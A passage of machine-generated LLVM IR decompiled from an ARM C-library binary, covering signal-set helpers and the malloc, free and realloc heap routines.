  br i1 %tmp19, label %dec_label_pc_14c80, label %dec_label_pc_14c70

dec_label_pc_14c70:                               ; preds = %bb
  %v7_14c74 = icmp sgt i32 %v0_14c68.pre, 64
  br i1 %v7_14c74, label %dec_label_pc_14c80, label %bb20

bb20:                                             ; preds = %dec_label_pc_14c70
  store i32 %arg2, i32* %stack_var_-152, align 4
  store i32 31, i32* %r0.global-to-local, align 4
  %v5_14ca424 = add i32 %v10_14c58, 124
  br label %dec_label_pc_14c94

dec_label_pc_14c80:                               ; preds = %.thread, %dec_label_pc_14c70, %bb
  %v0_14c80 = call i32 @__errno_location()
  store i32 %v0_14c80, i32* %r0.global-to-local, align 4
  store i32 -1, i32* @r2, align 4
  %v2_14c8c = inttoptr i32 %v0_14c80 to i32*
  store i32 22, i32* %v2_14c8c, align 4
  %v0_14d00.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_14d00

dec_label_pc_14c94:                               ; preds = %bb20, %dec_label_pc_14c94
  %v5_14ca425 = phi i32 [ %v5_14ca424, %bb20 ], [ %v5_14ca4, %dec_label_pc_14c94 ]
  %v2_14c98 = add i32 %v5_14ca425, -136
  %v3_14c98 = inttoptr i32 %v2_14c98 to i32*
  store i32 0, i32* %v3_14c98, align 4
  %v0_14c9c.pre = load i32, i32* %r0.global-to-local, align 4
  %v1_14c9c = add i32 %v0_14c9c.pre, -1
  store i32 %v1_14c9c, i32* %r0.global-to-local, align 4
  %v6_14c9c = icmp slt i32 %v1_14c9c, 0
  %v4_14ca4 = mul i32 %v1_14c9c, 4
  %v5_14ca4 = add i32 %v4_14ca4, %v10_14c58
  br i1 %v6_14c9c, label %dec_label_pc_14cac, label %dec_label_pc_14c94

dec_label_pc_14cac:                               ; preds = %dec_label_pc_14c94
  %v2_14cac = ptrtoint i32* %stack_var_-152 to i32
  store i32 %v2_14cac, i32* @r5, align 4
  %v2_14cb0 = ptrtoint i32* %stack_var_-148 to i32
  store i32 %v2_14cb0, i32* @r0, align 4
  %v0_14cb4 = load i32, i32* @r4, align 4
  store i32 %v0_14cb4, i32* @r1, align 4
  %v0_14cb8 = call i32 @__sigaddset()
  store i32 %v0_14cb8, i32* %r0.global-to-local, align 4
  %v1_14cbc = icmp slt i32 %v0_14cb8, 0
  br i1 %v1_14cbc, label %dec_label_pc_14cfc, label %dec_label_pc_14cc4

dec_label_pc_14cc4:                               ; preds = %dec_label_pc_14cac
  %v0_14cc4 = load i32, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_33890.1140 to i32), i32* %r0.global-to-local, align 4
  %v2_14ccc = call i32 @__sigismember(i32 ptrtoint (i32* @global_var_33890.1140 to i32), i32 %v0_14cc4)
  %v0_14ce4 = load i32, i32* @r4, align 4
  store i32 %v0_14ce4, i32* %r0.global-to-local, align 4
  %v4_14cec = call i32 @__libc_sigaction(i32 %v0_14ce4, i32* nonnull %stack_var_-152, i32 %v2_14c64)
  store i32 %v4_14cec, i32* %r0.global-to-local, align 4
  %v1_14cf0 = icmp slt i32 %v4_14cec, 0
  br i1 %v1_14cf0, label %dec_label_pc_14cfc, label %bb23

bb23:                                             ; preds = %dec_label_pc_14cc4
  %v5_14cf4 = load i32, i32* %stack_var_-292, align 4
  store i32 %v5_14cf4, i32* @r2, align 4
  br label %dec_label_pc_14d00

dec_label_pc_14cfc:                               ; preds = %dec_label_pc_14cc4, %dec_label_pc_14cac
  store i32 -1, i32* @r2, align 4
  br label %dec_label_pc_14d00

dec_label_pc_14d00:                               ; preds = %bb23, %dec_label_pc_14c80, %dec_label_pc_14cfc
  %v0_14d00 = phi i32 [ %v5_14cf4, %bb23 ], [ %v0_14d00.pre, %dec_label_pc_14c80 ], [ -1, %dec_label_pc_14cfc ]
  store i32 %v0_14d00, i32* %r0.global-to-local, align 4
  %v2_14d08 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_14d08, i32* @r4, align 4
  store i32 %v6_14c58, i32* @r5, align 4
  ret i32 %v0_14d00

; uselistorder directives
  uselistorder i32 %v0_14d00, { 1, 0 }
  uselistorder i32 %v1_14c9c, { 0, 2, 1 }
  uselistorder i32 %v0_14c68.pre, { 1, 0, 2 }
  uselistorder i32 %v10_14c58, { 1, 0 }
  uselistorder i32* %stack_var_-12, { 0, 2, 1 }
  uselistorder i32* %stack_var_-152, { 0, 2, 1 }
  uselistorder i32* %r0.global-to-local, { 2, 4, 3, 5, 7, 6, 9, 8, 10, 0, 1 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_14d00, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14c94, { 1, 0 }
  uselistorder label %dec_label_pc_14c80, { 1, 2, 0 }
}

define i32 @__sigismember(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_14d10 = add i32 %arg2, -1
  %v3_14d14 = udiv i32 %v1_14d10, 32
  %v4_14d18 = mul nuw nsw i32 %v3_14d14, 4
  %v5_14d18 = add i32 %v4_14d18, %arg1
  %v6_14d18 = inttoptr i32 %v5_14d18 to i32*
  %v7_14d18 = load i32, i32* %v6_14d18, align 4
  %v1_14d1c = urem i32 %v1_14d10, 32
  %v7_14d24 = shl i32 1, %v1_14d1c
  %v8_14d24 = and i32 %v7_14d18, %v7_14d24
  %v10_14d24 = icmp ne i32 %v8_14d24, 0
  %. = zext i1 %v10_14d24 to i32
  ret i32 %.

; uselistorder directives
  uselistorder i32 %v1_14d10, { 1, 0 }
}

define i32 @__sigaddset() local_unnamed_addr {
entry:
  %v0_14d34 = load i32, i32* @r1, align 4
  %v1_14d34 = add i32 %v0_14d34, -1
  %v3_14d38 = udiv i32 %v1_14d34, 32
  %v0_14d3c = load i32, i32* @r0, align 4
  %v4_14d3c = mul nuw nsw i32 %v3_14d38, 4
  %v5_14d3c = add i32 %v0_14d3c, %v4_14d3c
  %v6_14d3c = inttoptr i32 %v5_14d3c to i32*
  %v7_14d3c = load i32, i32* %v6_14d3c, align 4
  %v1_14d40 = urem i32 %v1_14d34, 32
  %v7_14d48 = shl i32 1, %v1_14d40
  %v8_14d48 = or i32 %v7_14d3c, %v7_14d48
  store i32 %v8_14d48, i32* %v6_14d3c, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_14d34, { 1, 0 }
}

define i32 @__sigdelset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_14d58 = add i32 %arg2, -1
  %v3_14d5c = udiv i32 %v1_14d58, 32
  %v4_14d60 = mul nuw nsw i32 %v3_14d5c, 4
  %v5_14d60 = add i32 %v4_14d60, %arg1
  %v6_14d60 = inttoptr i32 %v5_14d60 to i32*
  %v7_14d60 = load i32, i32* %v6_14d60, align 4
  %v1_14d64 = urem i32 %v1_14d58, 32
  %tmp = shl i32 -1, %v1_14d64
  %v8_14d6c = add i32 %tmp, -1
  %v9_14d6c = and i32 %v7_14d60, %v8_14d6c
  store i32 %v9_14d6c, i32* %v6_14d60, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_14d58, { 1, 0 }
}

define i32 @malloc(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_14d7c = load i32, i32* @r4, align 4
  %v6_14d7c = load i32, i32* @r5, align 4
  %v9_14d7c = load i32, i32* @r6, align 4
  %v0_14d80 = load i32, i32* %r0.global-to-local, align 4
  %v2_14d80 = icmp eq i32 %v0_14d80, 0
  %v2_14d84 = ptrtoint i32* %stack_var_-20 to i32
  br i1 %v2_14d80, label %bb, label %dec_label_pc_14d90

bb:                                               ; preds = %entry
  store i32 1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14d98

dec_label_pc_14d90:                               ; preds = %entry
  %tmp = icmp ugt i32 %v0_14d80, -8
  br i1 %tmp, label %dec_label_pc_14e9c, label %dec_label_pc_14d98

dec_label_pc_14d98:                               ; preds = %bb, %dec_label_pc_14d90
  %v0_14d98 = phi i32 [ %v0_14d80, %dec_label_pc_14d90 ], [ 1, %bb ]
  %v1_14d98 = add i32 %v0_14d98, 4
  store i32 %v1_14d98, i32* %stack_var_-20, align 4
  store i32 %v2_14d84, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_33820.1142 to i32), i32* %r0.global-to-local, align 4
  %v1_14db0 = call i32 @__pthread_return_0()
  store i32 ptrtoint (i32** @global_var_2d3d0.1146 to i32), i32* %r0.global-to-local, align 4
  %v3_14dbc = call i32 @__heap_alloc(i32* bitcast (i32** @global_var_2d3d0.1146 to i32*), i32 %v2_14d84)
  store i32 %v3_14dbc, i32* %r4.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_33820.1142 to i32), i32* %r0.global-to-local, align 4
  store i32 85460, i32* @lr, align 4
  %v1_14dd0 = call i32 @__pthread_return_0()
  store i32 %v1_14dd0, i32* %r0.global-to-local, align 4
  %v2_14dd4 = icmp eq i32 %v3_14dbc, 0
  br i1 %v2_14dd4, label %dec_label_pc_14ddc, label %dec_label_pc_14e8c

dec_label_pc_14ddc:                               ; preds = %dec_label_pc_14d98
  %v2_14de0 = load i32, i32* @global_var_33848.986, align 4
  store i32 %v2_14de0, i32* @r4, align 4
  %v2_14de4 = load i32, i32* %stack_var_-20, align 4
  %v3_14de8 = icmp ult i32 %v2_14de4, %v2_14de0
  br i1 %v3_14de8, label %.thread3, label %bb14

bb14:                                             ; preds = %dec_label_pc_14ddc
  %v3_14dec = add i32 %v2_14de0, -1
  %v2_14df0 = add i32 %v3_14dec, %v2_14de4
  %v2_14df4 = sub i32 0, %v2_14de0
  %v3_14df8 = and i32 %v2_14df0, %v2_14df4
  store i32 %v3_14df8, i32* @r4, align 4
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_14ddc, %bb14
  store i32 ptrtoint (i32* @global_var_33910.1150 to i32), i32* %r0.global-to-local, align 4
  %v1_14e04 = call i32 @__pthread_return_0()
  %v0_14e08 = load i32, i32* @r4, align 4
  store i32 %v0_14e08, i32* %r0.global-to-local, align 4
  %v1_14e0c = call i32 @__GI_sbrk(i32 %v0_14e08)
  store i32 %v1_14e0c, i32* %r0.global-to-local, align 4
  %v7_14e10 = icmp eq i32 %v1_14e0c, -1
  br i1 %v7_14e10, label %bb15, label %dec_label_pc_14e1c

bb15:                                             ; preds = %.thread3
  store i32 %v1_14e0c, i32* @r5, align 4
  br label %dec_label_pc_14e30

dec_label_pc_14e1c:                               ; preds = %.thread3
  %v1_14e1c = add i32 %v1_14e0c, 3
  %v1_14e20 = and i32 %v1_14e1c, -4
  store i32 %v1_14e20, i32* @r5, align 4
  %v9_14e24 = icmp eq i32 %v1_14e20, %v1_14e0c
  br i1 %v9_14e24, label %bb17, label %bb16

bb16:                                             ; preds = %dec_label_pc_14e1c
  %v3_14e28 = sub i32 %v1_14e20, %v1_14e0c
  store i32 %v3_14e28, i32* %r0.global-to-local, align 4
  br label %bb17

bb17:                                             ; preds = %dec_label_pc_14e1c, %bb16
  %v1_14e2c = xor i1 %v9_14e24, true
  call void @__pseudo_cond_branch(i1 %v1_14e2c, i32 ptrtoint (i32* @global_var_164fc.1151 to i32))
  br label %dec_label_pc_14e30

dec_label_pc_14e30:                               ; preds = %bb15, %bb17
  store i32 ptrtoint (i32* @global_var_33910.1150 to i32), i32* %r0.global-to-local, align 4
  store i32 85568, i32* @lr, align 4
  %v1_14e3c = call i32 @__pthread_return_0()
  store i32 %v1_14e3c, i32* %r0.global-to-local, align 4
  %v0_14e40 = load i32, i32* @r5, align 4
  %v7_14e40 = icmp eq i32 %v0_14e40, -1
  br i1 %v7_14e40, label %dec_label_pc_14e9c, label %dec_label_pc_14e48

dec_label_pc_14e48:                               ; preds = %dec_label_pc_14e30
  store i32 ptrtoint (i32* @global_var_33820.1142 to i32), i32* %r0.global-to-local, align 4
  %v1_14e54 = call i32 @__pthread_return_0()
  %v0_14e58 = load i32, i32* @r4, align 4
  %v0_14e5c = load i32, i32* @r5, align 4
  store i32 ptrtoint (i32** @global_var_2d3d0.1146 to i32), i32* %r0.global-to-local, align 4
  %sext = mul i32 %v0_14e5c, 16777216
  %v2_14e64 = sdiv i32 %sext, 16777216
  %v5_14e64 = call i32 @__heap_free(i32* bitcast (i32** @global_var_2d3d0.1146 to i32*), i32 %v2_14e64, i32 %v0_14e58)
  store i32 ptrtoint (i32** @global_var_2d3d0.1146 to i32), i32* %r0.global-to-local, align 4
  %v3_14e70 = call i32 @__heap_alloc(i32* bitcast (i32** @global_var_2d3d0.1146 to i32*), i32 %v2_14d84)
  store i32 %v3_14e70, i32* %r4.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_33820.1142 to i32), i32* %r0.global-to-local, align 4
  store i32 85636, i32* @lr, align 4
  %v1_14e80 = call i32 @__pthread_return_0()
  store i32 %v1_14e80, i32* %r0.global-to-local, align 4
  %v2_14e84 = icmp eq i32 %v3_14e70, 0
  br i1 %v2_14e84, label %dec_label_pc_14e9c, label %dec_label_pc_14e8c

dec_label_pc_14e8c:                               ; preds = %dec_label_pc_14d98, %dec_label_pc_14e48
  %v1_14e90 = phi i32 [ %v3_14dbc, %dec_label_pc_14d98 ], [ %v3_14e70, %dec_label_pc_14e48 ]
  %v2_14e8c = load i32, i32* %stack_var_-20, align 4
  %v2_14e90 = inttoptr i32 %v1_14e90 to i32*
  store i32 %v2_14e8c, i32* %v2_14e90, align 4
  %v3_14e90 = load i32, i32* %r4.global-to-local, align 4
  %v4_14e90 = add i32 %v3_14e90, 4
  store i32 %v4_14e90, i32* %r4.global-to-local, align 4
  %v2_14e94 = icmp eq i32 %v4_14e90, 0
  br i1 %v2_14e94, label %dec_label_pc_14e9c, label %dec_label_pc_14eac

dec_label_pc_14e9c:                               ; preds = %dec_label_pc_14e8c, %dec_label_pc_14e48, %dec_label_pc_14e30, %dec_label_pc_14d90
  %v0_14e9c = call i32 @__errno_location()
  store i32 %v0_14e9c, i32* %r0.global-to-local, align 4
  %v2_14ea4 = inttoptr i32 %v0_14e9c to i32*
  store i32 12, i32* %v2_14ea4, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14eac

dec_label_pc_14eac:                               ; preds = %dec_label_pc_14e8c, %dec_label_pc_14e9c
  %v0_14eac = phi i32 [ %v4_14e90, %dec_label_pc_14e8c ], [ 0, %dec_label_pc_14e9c ]
  store i32 %v0_14eac, i32* %r0.global-to-local, align 4
  store i32 %v3_14d7c, i32* @r4, align 4
  store i32 %v6_14d7c, i32* @r5, align 4
  store i32 %v9_14d7c, i32* @r6, align 4
  ret i32 %v0_14eac

; uselistorder directives
  uselistorder i32 %v0_14eac, { 1, 0 }
  uselistorder i32 %v3_14e70, { 1, 0, 2 }
  uselistorder i32 %v1_14e20, { 1, 0, 2 }
  uselistorder i32 %v1_14e0c, { 3, 0, 2, 4, 1, 5 }
  uselistorder i32 %v3_14dbc, { 1, 0, 2 }
  uselistorder i32 %v0_14d80, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 3, 2, 4 }
  uselistorder i32* %r0.global-to-local, { 5, 7, 4, 6, 8, 9, 10, 2, 12, 11, 16, 14, 13, 3, 15, 17, 18, 19, 0, 1 }
  uselistorder label %dec_label_pc_14eac, { 1, 0 }
  uselistorder label %dec_label_pc_14e8c, { 1, 0 }
  uselistorder label %dec_label_pc_14e30, { 1, 0 }
  uselistorder label %bb17, { 1, 0 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %dec_label_pc_14d98, { 1, 0 }
}

define i32 @free() local_unnamed_addr {
entry:
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v0_14ed0 = load i32, i32* @r0, align 4
  %v2_14ed0 = icmp eq i32 %v0_14ed0, 0
  %v3_14ed4 = load i32, i32* @r4, align 4
  store i32 %v3_14ed4, i32* %stack_var_-24, align 4
  %v6_14ed4 = load i32, i32* @r5, align 4
  %v9_14ed4 = load i32, i32* @r6, align 4
  %v15_14ed4 = load i32, i32* @r8, align 4
  br i1 %v2_14ed0, label %bb, label %bb11

bb:                                               ; preds = %entry
  ret i32 0

bb11:                                             ; preds = %entry
  %v1_14edc = add i32 %v0_14ed0, -4
  %v2_14edc = inttoptr i32 %v1_14edc to i32*
  %v3_14edc = load i32, i32* %v2_14edc, align 4
  store i32 %v3_14edc, i32* @r5, align 4
  store i32 ptrtoint (i32** @global_var_2d3d0.1146 to i32), i32* %r8.global-to-local, align 4
  store i32 %v1_14edc, i32* @r4, align 4
  %v1_14ef4 = call i32 @__pthread_return_0()
  %v0_14ef8 = load i32, i32* @r4, align 4
  %v0_14efc = load i32, i32* @r5, align 4
  %v4_14f04 = call i32 @__heap_free(i32* bitcast (i32** @global_var_2d3d0.1146 to i32*), i32 %v0_14ef8, i32 %v0_14efc)
  %v1_14f0c = inttoptr i32 %v4_14f04 to i32*
  %v2_14f0c = load i32, i32* %v1_14f0c, align 4
  store i32 %v2_14f0c, i32* %r6.global-to-local, align 4
  %v2_14f10 = load i32, i32* @global_var_33848.986, align 4
  %v4_14f14 = mul i32 %v2_14f10, 8
  %v6_14f14 = icmp ult i32 %v2_14f0c, %v4_14f14
  store i32 %v4_14f04, i32* @r4, align 4
  br i1 %v6_14f14, label %dec_label_pc_14f54, label %dec_label_pc_14f20

dec_label_pc_14f20:                               ; preds = %bb11
  %v1_14f28 = call i32 @__pthread_return_0()
  %v1_14f30 = call i32 @__GI_sbrk(i32 0)
  %v0_14f34 = load i32, i32* @r4, align 4
  %v1_14f34 = add i32 %v0_14f34, 12
  store i32 %v1_14f34, i32* @r5, align 4
  %v9_14f38 = icmp eq i32 %v1_14f34, %v1_14f30
  br i1 %v9_14f38, label %dec_label_pc_14f5c, label %dec_label_pc_14f40

dec_label_pc_14f40:                               ; preds = %dec_label_pc_14f20
  %v1_14f4c = call i32 @__pthread_return_0()
  br label %dec_label_pc_14f54

dec_label_pc_14f54:                               ; preds = %bb11, %dec_label_pc_14f40, %bb14
  %v2_14f54 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_14f54, i32* @r4, align 4
  store i32 %v6_14ed4, i32* @r5, align 4
  store i32 %v9_14ed4, i32* %r6.global-to-local, align 4
  store i32 %v15_14ed4, i32* %r8.global-to-local, align 4
  %v0_14f58 = call i32 @__pthread_return_0()
  %v0_14f5c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_14f5c

dec_label_pc_14f5c:                               ; preds = %dec_label_pc_14f20, %dec_label_pc_14f54
  %v1_14f64 = phi i32 [ %v0_14f34, %dec_label_pc_14f20 ], [ %v0_14f5c.pre, %dec_label_pc_14f54 ]
  %v1_14f5c = add i32 %v1_14f64, 4
  %v2_14f5c = inttoptr i32 %v1_14f5c to i32*
  %v3_14f5c = load i32, i32* %v2_14f5c, align 4
  %v2_14f60 = icmp eq i32 %v3_14f5c, 0
  br i1 %v2_14f60, label %.thread, label %bb12

bb12:                                             ; preds = %dec_label_pc_14f5c
  %v2_14f64 = add i32 %v1_14f64, 8
  %v3_14f64 = inttoptr i32 %v2_14f64 to i32*
  %v4_14f64 = load i32, i32* %v3_14f64, align 4
  %v3_14f68 = add i32 %v3_14f5c, 8
  %v4_14f68 = inttoptr i32 %v3_14f68 to i32*
  store i32 %v4_14f64, i32* %v4_14f68, align 4
  %v0_14f6c.pre = load i32, i32* @r4, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_14f5c, %bb12
  %v0_14f6c = phi i32 [ %v1_14f64, %dec_label_pc_14f5c ], [ %v0_14f6c.pre, %bb12 ]
  %v1_14f6c = add i32 %v0_14f6c, 8
  %v2_14f6c = inttoptr i32 %v1_14f6c to i32*
  %v3_14f6c = load i32, i32* %v2_14f6c, align 4
  %v1_14f70 = add i32 %v0_14f6c, 4
  %v2_14f70 = inttoptr i32 %v1_14f70 to i32*
  %v3_14f70 = load i32, i32* %v2_14f70, align 4
  %v2_14f74 = icmp eq i32 %v3_14f6c, 0
  br i1 %v2_14f74, label %.thread1, label %bb13

bb13:                                             ; preds = %.thread
  %v3_14f78 = add i32 %v3_14f6c, 4
  %v4_14f78 = inttoptr i32 %v3_14f78 to i32*
  store i32 %v3_14f70, i32* %v4_14f78, align 4
  br label %bb14

.thread1:                                         ; preds = %.thread
  %v2_14f7c = load i32, i32* %r8.global-to-local, align 4
  %v3_14f7c = inttoptr i32 %v2_14f7c to i32*
  store i32 %v3_14f70, i32* %v3_14f7c, align 4
  br label %bb14

bb14:                                             ; preds = %bb13, %.thread1
  %v1_14f8c = call i32 @__pthread_return_0()
  %v0_14f90 = load i32, i32* %r6.global-to-local, align 4
  %v1_14f90 = load i32, i32* @r4, align 4
  %v0_14f98 = load i32, i32* @r5, align 4
  %v2_14f90 = sub i32 12, %v0_14f90
  %v1_14f94 = add i32 %v2_14f90, %v1_14f90
  %v2_14f98 = sub i32 %v1_14f94, %v0_14f98
  %v1_14f9c = call i32 @__GI_sbrk(i32 %v2_14f98)
  br label %dec_label_pc_14f54

; uselistorder directives
  uselistorder i32 %v0_14f6c, { 1, 0 }
  uselistorder i32* %r8.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2 }
  uselistorder i32 (i32)* @__GI_sbrk, { 2, 1, 0 }
  uselistorder label %bb14, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_14f5c, { 1, 0 }
  uselistorder label %dec_label_pc_14f54, { 2, 1, 0 }
}

define i32 @realloc(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_14fc0 = load i32, i32* @r4, align 4
  store i32 %v3_14fc0, i32* %stack_var_-24, align 4
  %v6_14fc0 = load i32, i32* @r5, align 4
  %v9_14fc0 = load i32, i32* @r6, align 4
  %v12_14fc0 = load i32, i32* @r7, align 4
  %v15_14fc0 = load i32, i32* @r8, align 4
  %v18_14fc0 = load i32, i32* @lr, align 4
  store i32 %arg2, i32* @r4, align 4
  %v2_14fc4 = icmp eq i32 %arg2, 0
  %v0_14fc8 = load i32, i32* @r0, align 4
  store i32 %v0_14fc8, i32* @r7, align 4
  br i1 %v2_14fc4, label %dec_label_pc_14fd0, label %dec_label_pc_14fd8

dec_label_pc_14fd0:                               ; preds = %entry
  %v0_14fd0 = call i32 @free()
  %v0_14fe0.pre = load i32, i32* @r4, align 4
  %v2_14fe4.pre = load i32, i32* %stack_var_-24, align 4
  br label %dec_label_pc_14fe0

dec_label_pc_14fd8:                               ; preds = %entry
  %v2_14fd8 = icmp eq i32 %v0_14fc8, 0
  br i1 %v2_14fd8, label %dec_label_pc_14fe0, label %dec_label_pc_14fec

dec_label_pc_14fe0:                               ; preds = %dec_label_pc_14fd8, %dec_label_pc_14fd0
  %v2_14fe4 = phi i32 [ %v3_14fc0, %dec_label_pc_14fd8 ], [ %v2_14fe4.pre, %dec_label_pc_14fd0 ]
  %v0_14fe0 = phi i32 [ %arg2, %dec_label_pc_14fd8 ], [ %v0_14fe0.pre, %dec_label_pc_14fd0 ]
  store i32 %v2_14fe4, i32* @r4, align 4
  store i32 %v6_14fc0, i32* @r5, align 4
  store i32 %v9_14fc0, i32* @r6, align 4
  store i32 %v12_14fc0, i32* @r7, align 4
  store i32 %v18_14fc0, i32* @lr, align 4
  %v1_14fe8 = call i32 @malloc(i32 %v0_14fe0)
  %v0_14fec.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_14fec

dec_label_pc_14fec:                               ; preds = %dec_label_pc_14fd8, %dec_label_pc_14fe0
  %v0_15004 = phi i32 [ %v0_14fc8, %dec_label_pc_14fd8 ], [ %v1_14fe8, %dec_label_pc_14fe0 ]
  %v0_14fec = phi i32 [ %arg2, %dec_label_pc_14fd8 ], [ %v0_14fec.pre, %dec_label_pc_14fe0 ]
  %v1_14fec = add i32 %v0_14fec, 7
  %v1_14ff0 = and i32 %v1_14fec, -4
  store i32 %v1_14ff0, i32* @r5, align 4
  %v2_14ff4 = icmp ugt i32 %v1_14ff0, 10
  %v1_14ff8 = add i32 %v0_15004, -4
  %v2_14ff8 = inttoptr i32 %v1_14ff8 to i32*
  %v3_14ff8 = load i32, i32* %v2_14ff8, align 4
  store i32 %v3_14ff8, i32* @r6, align 4
  br i1 %v2_14ff4, label %bb14, label %bb

bb:                                               ; preds = %dec_label_pc_14fec
  store i32 12, i32* @r5, align 4
  br label %bb14

bb14:                                             ; preds = %dec_label_pc_14fec, %bb
  %v0_15080 = phi i32 [ %v1_14ff0, %dec_label_pc_14fec ], [ 12, %bb ]
  store i32 %v1_14ff8, i32* @r8, align 4
  %tmp = icmp ugt i32 %v0_15080, %v3_14ff8
  br i1 %tmp, label %dec_label_pc_1500c, label %dec_label_pc_15080

dec_label_pc_1500c:                               ; preds = %bb14
  %v2_15000 = sub i32 %v0_15080, %v3_14ff8
  %v1_1501c = call i32 @__pthread_return_0()
  %v0_15024 = load i32, i32* @r8, align 4
  %v1_15024 = load i32, i32* @r6, align 4
  %v2_15024 = add i32 %v1_15024, %v0_15024
  %v4_1502c = call i32 @__heap_alloc_at(i32* bitcast (i32** @global_var_2d3d0.1146 to i32*), i32 %v2_15024, i32 %v2_15000)
  store i32 %v4_1502c, i32* @r4, align 4
  store i32 86084, i32* @lr, align 4
  %v1_15040 = call i32 @__pthread_return_0()
  %v0_15044 = load i32, i32* @r4, align 4
  %v2_15044 = icmp eq i32 %v0_15044, 0
  br i1 %v2_15044, label %dec_label_pc_15054, label %.thread

.thread:                                          ; preds = %dec_label_pc_1500c
  %v1_15048 = load i32, i32* @r6, align 4
  %v3_15048 = add i32 %v1_15048, %v0_15044
  %v2_1504c = load i32, i32* @r7, align 4
  %v3_1504c = add i32 %v2_1504c, -4
  %v4_1504c = inttoptr i32 %v3_1504c to i32*
  store i32 %v3_15048, i32* %v4_1504c, align 4
  br label %dec_label_pc_150c0

dec_label_pc_15054:                               ; preds = %dec_label_pc_1500c
  %v0_15054 = load i32, i32* @r5, align 4
  %v1_15054 = add i32 %v0_15054, -4
  %v1_15058 = call i32 @malloc(i32 %v1_15054)
  store i32 %v1_15058, i32* @r0, align 4
  store i32 %v1_15058, i32* @r4, align 4
  %v2_1505c = icmp eq i32 %v1_15058, 0
  br i1 %v2_1505c, label %dec_label_pc_15078, label %dec_label_pc_15064

dec_label_pc_15064:                               ; preds = %dec_label_pc_15054
  %v0_15064 = load i32, i32* @r6, align 4
  %v1_15064 = add i32 %v0_15064, -4
  store i32 %v1_15064, i32* @r2, align 4
  %v0_15068 = load i32, i32* @r7, align 4
  store i32 %v0_15068, i32* @r1, align 4
  %v0_1506c = call i32 @memcpy()
  %v0_15070 = load i32, i32* @r7, align 4
  store i32 %v0_15070, i32* @r0, align 4
  %v0_15074 = call i32 @free()
  %v0_15078.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_15078

dec_label_pc_15078:                               ; preds = %dec_label_pc_15054, %dec_label_pc_15064
  %v0_15078 = phi i32 [ 0, %dec_label_pc_15054 ], [ %v0_15078.pre, %dec_label_pc_15064 ]
  store i32 %v0_15078, i32* @r7, align 4
  br label %dec_label_pc_150c0

dec_label_pc_15080:                               ; preds = %bb14
  %v1_15080 = add i32 %v0_15080, 28
  %tmp15 = icmp ugt i32 %v1_15080, %v3_14ff8
  br i1 %tmp15, label %dec_label_pc_150c0, label %dec_label_pc_1508c

dec_label_pc_1508c:                               ; preds = %dec_label_pc_15080
  %v1_15098 = call i32 @__pthread_return_0()
  %v0_1509c = load i32, i32* @r8, align 4
  %v1_1509c = load i32, i32* @r5, align 4
  %v2_1509c = add i32 %v1_1509c, %v0_1509c
  %v1_150a0 = load i32, i32* @r6, align 4
  %v2_150a0 = sub i32 %v1_150a0, %v1_1509c
  %v4_150a8 = call i32 @__heap_free(i32* bitcast (i32** @global_var_2d3d0.1146 to i32*), i32 %v2_1509c, i32 %v2_150a0)
  store i32 86204, i32* @lr, align 4
  %v1_150b8 = call i32 @__pthread_return_0()
  %v0_150bc = load i32, i32* @r5, align 4
  %v1_150bc = load i32, i32* @r7, align 4
  %v2_150bc = add i32 %v1_150bc, -4
  %v3_150bc = inttoptr i32 %v2_150bc to i32*
  store i32 %v0_150bc, i32* %v3_150bc, align 4
  br label %dec_label_pc_150c0

dec_label_pc_150c0:                               ; preds = %.thread, %dec_label_pc_15080, %dec_label_pc_15078, %dec_label_pc_1508c
  %v0_150c0 = load i32, i32* @r7, align 4
  store i32 %v9_14fc0, i32* @r6, align 4
  store i32 %v15_14fc0, i32* @r8, align 4
  ret i32 %v0_150c0

; uselistorder directives
  uselistorder i32 %v1_1509c, { 1, 0 }
  uselistorder i32 %v0_15080, { 1, 2, 0 }
  uselistorder i32 %v3_14ff8, { 0, 2, 1, 3 }
  uselistorder i32** @global_var_2d3d0.1146, { 1, 0 }
  uselistorder i32* bitcast (i32** @global_var_2d3d0.1146 to i32*), { 1, 2, 0, 3, 4, 5 }
  uselistorder label %dec_label_pc_150c0, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_15078, { 1, 0 }
  uselistorder label %bb14, { 1, 0 }
  uselistorder label %dec_label_pc_14fec, { 1, 0 }
}

define i32 @__heap_alloc(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
